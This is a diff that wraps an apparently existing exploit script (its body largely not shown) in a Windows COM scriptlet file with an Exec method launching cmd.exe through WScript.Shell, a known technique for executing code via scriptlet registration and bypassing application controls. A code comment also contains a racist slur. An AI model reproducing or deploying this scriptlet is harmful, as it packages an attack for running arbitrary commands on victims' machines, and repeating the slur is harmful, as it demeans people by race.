@@ -1,3 +1,17 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Banana"
+    progid="Apple"
+    version="1.0"
+    classid="{20001111-1000-0000-0000-0000FEEDDCDC}"
+	>
+	<!-- made by unknown. i just turned it into scriptlet -->
+	<!-- i hate niggers -->
+	<script language="JScript">
+		<![CDATA[
+	                       
 function setversion() {
 }
 function debug(s) {}
@@ -195,3 +209,22 @@ try {
 } catch (e) {
     debug(e.message);
 }
+		]]>
+</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	}
+	
+]]>
+</script>
+
+</scriptlet>
